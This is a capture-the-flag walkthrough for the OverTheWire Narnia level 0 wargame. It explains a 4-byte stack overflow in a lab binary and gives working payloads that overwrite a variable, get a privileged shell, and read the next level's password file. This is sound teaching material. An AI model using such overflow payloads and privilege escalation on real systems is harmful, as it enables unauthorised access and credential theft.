
# narnia0 -> narnia1 Guide

## Connecting to the Server
Start by connecting to the OverTheWire Narnia game server:

```bash
> ssh narnia0@narnia.labs.overthewire.org -p 2226
```

## Understanding the Vulnerability
The source code for the narnia0 program contains a buffer overflow vulnerability:
```bash
> narnia0@narnia:~$ cat /narnia/narnia0.c
```
`/narnia/narnia0.c`
```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    long val = 0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s", buf);

    printf("buf: %s\n", buf);
    printf("val: 0x%08lx\n", val);

    if (val == 0xdeadbeef) {
        setreuid(geteuid(), geteuid());
        system("/bin/sh");
    } else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }
    
    return 0;
}
```

## Key Points
* Buffer Size: `char buf[20];` allocates 20 bytes for buf.
* Input Size: `scanf("%24s", buf);` reads up to 24 bytes into buf, allowing an overflow of 4 bytes.
* Initial Value: val is initially set to `0x41414141`, which corresponds to the string `"AAAA"`.
* Goal: Modify val to `0xdeadbeef` to gain shell access.

## Explanation
* Buffer Overflow: The mismatch between the buffer size (20 bytes) and the allowed input size (24 bytes) enables overwriting adjacent memory, specifically the val variable.
* Endianness: On x86 and x86-64 architectures, multi-byte values are stored in little-endian order. Thus, to set val to `0xdeadbeef`, the input needs to be provided in reverse order: `\xef\xbe\xad\xde`.

## Demonstrating the Overflow
Initial Test with 20 A's
First, test the program with 20 'A's to observe the behavior:
```bash
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: AAAAAAAAAAAAAAAAAAAA
buf: AAAAAAAAAAAAAAAAAAAA
val: 0x41414100
WAY OFF!!!!
```

Modifying val with 20 A's and 4 B's
Next, try to change val by adding 20 'A's and 4 'B's:
```bash
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: AAAAAAAAAAAAAAAAAAAABBBB
buf: AAAAAAAAAAAAAAAAAAAABBBB
val: 0x42424242
WAY OFF!!!!
```

## Exploiting the Vulnerability
To exploit the buffer overflow, input 20 'A's followed by the little-endian representation of 0xdeadbeef:
```bash
narnia0@narnia:~$ python -c 'print("A"*20 + "\xef\xbe\xad\xde")' | /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
```

## Obtaining the narnia1 Password
With the buffer overflow successful, escalate privileges to read the password for narnia1:
```bash
narnia0@narnia:~$ (python -c 'print("A"*20 + "\xef\xbe\xad\xde")'; echo 'cat /etc/narnia_pass/narnia1') | /narnia/narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
efeidiedae       # password for narnia1
```

## Manual Approach
Alternatively, generate the payload, copy it, and use it manually:
```bash
narnia0@narnia:/narnia$ (echo -e 'AAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde\xaf';cat)
AAAAAAAAAAAAAAAAAAAAﾭޯ
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: AAAAAAAAAAAAAAAAAAAAﾭޯ
buf: AAAAAAAAAAAAAAAAAAAAﾭ
val: 0xdeadbeef
$ whoami
narnia1
$ cat /etc/narnia_pass/narnia1
efeidiedae       # password for narnia1
```

## Summary
* Vulnerability: Buffer overflow due to scanf allowing more input than the buffer can hold.
* Exploit: Overwrite val to `0xdeadbeef` using crafted input.
* Result: Gain shell access and retrieve the password for the next level.